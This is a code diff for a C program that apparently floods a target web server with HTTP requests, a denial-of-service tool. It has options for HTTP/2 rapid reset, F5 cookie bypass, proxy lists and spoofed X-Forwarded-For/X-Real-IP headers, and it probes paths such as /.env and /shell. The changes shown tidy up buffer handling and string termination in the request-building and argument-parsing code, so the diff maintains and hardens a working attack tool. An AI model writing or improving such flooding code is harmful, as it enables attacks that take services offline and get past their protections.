@@ -17,7 +17,6 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <openssl/rand.h>
-#include <regex.h>
 
 #define MAX_WORKERS 2000
 #define MAX_URL_LEN 4096
@@ -73,7 +72,7 @@ typedef struct {
     bool http2_rapid_reset;
     bool cookie_rotation;
     char proxy_file[256];
-    char custom_cookie[512];
+    char custom_cookie[256];
     char user_agent_spoof[256];
 } AttackConfig;
 
@@ -100,7 +99,6 @@ const char *USER_AGENTS[] = {
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
     NULL
 };
 
@@ -111,7 +109,6 @@ const char *RANDOM_PATHS[] = {
     "/login", "/admin", "/cgi-bin/", "/phpinfo.php", "/.env",
     "/backup", "/config", "/database", "/dump", "/logs",
     "/wp-admin", "/administrator", "/console", "/shell", "/cmd",
-    "/", "/shell-go-plus.html",
     NULL
 };
 
@@ -284,33 +281,32 @@ void send_f5_attack_request(AttackConfig *cfg, const char *proxy) {
     char *ip = cfg->random_ip ? random_ip() : NULL;
     char *f5_cookie = cfg->cookie_rotation ? generate_f5_cookie() : NULL;
     
-    char ua_header[512];
-    char ip_header[256];
-    char cookie_header[512];
-    char f5_header[256];
+    char header_buffer[1024];
     
-    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua);
-    headers = curl_slist_append(headers, ua_header);
+    snprintf(header_buffer, sizeof(header_buffer), "User-Agent: %s", ua);
+    headers = curl_slist_append(headers, header_buffer);
     
     if (ip) {
-        snprintf(ip_header, sizeof(ip_header), "X-Forwarded-For: %s", ip);
-        headers = curl_slist_append(headers, ip_header);
-        snprintf(ip_header, sizeof(ip_header), "X-Real-IP: %s", ip);
-        headers = curl_slist_append(headers, ip_header);
+        snprintf(header_buffer, sizeof(header_buffer), "X-Forwarded-For: %s", ip);
+        headers = curl_slist_append(headers, header_buffer);
+        snprintf(header_buffer, sizeof(header_buffer), "X-Real-IP: %s", ip);
+        headers = curl_slist_append(headers, header_buffer);
     }
     
     if (f5_cookie && cfg->f5_bypass) {
-        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", f5_cookie);
-        headers = curl_slist_append(headers, cookie_header);
+        snprintf(header_buffer, sizeof(header_buffer), "Cookie: %s", f5_cookie);
+        headers = curl_slist_append(headers, header_buffer);
     }
     
     if (cfg->custom_cookie[0]) {
-        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", cfg->custom_cookie);
-        headers = curl_slist_append(headers, cookie_header);
+        snprintf(header_buffer, sizeof(header_buffer), "Cookie: %s", cfg->custom_cookie);
+        headers = curl_slist_append(headers, header_buffer);
     }
     
-    snprintf(f5_header, sizeof(f5_header), "X-F5-Client-IP: %s", ip ? ip : cfg->target_host);
-    headers = curl_slist_append(headers, f5_header);
+    char f5_header_value[256];
+    snprintf(f5_header_value, sizeof(f5_header_value), "%s", ip ? ip : cfg->target_host);
+    snprintf(header_buffer, sizeof(header_buffer), "X-F5-Client-IP: %s", f5_header_value);
+    headers = curl_slist_append(headers, header_buffer);
     
     headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
     headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
@@ -543,6 +539,7 @@ int main(int argc, char *argv[]) {
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
             strncpy(cfg.target_url, argv[++i], 1023);
+            cfg.target_url[1023] = '\0';
         } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
             cfg.duration_sec = atoi(argv[++i]);
         } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
@@ -569,10 +566,13 @@ int main(int argc, char *argv[]) {
             cfg.cookie_rotation = true;
         } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
             strncpy(cfg.proxy_file, argv[++i], 255);
+            cfg.proxy_file[255] = '\0';
         } else if (strcmp(argv[i], "-custom-cookie") == 0 && i+1 < argc) {
-            strncpy(cfg.custom_cookie, argv[++i], 511);
+            strncpy(cfg.custom_cookie, argv[++i], 255);
+            cfg.custom_cookie[255] = '\0';
         } else if (strcmp(argv[i], "-user-agent") == 0 && i+1 < argc) {
             strncpy(cfg.user_agent_spoof, argv[++i], 255);
+            cfg.user_agent_spoof[255] = '\0';
         } else if (strcmp(argv[i], "-help") == 0) {
             print_banner();
             printf("\nUsage: %s -url <target> [options]\n\n", argv[0]);
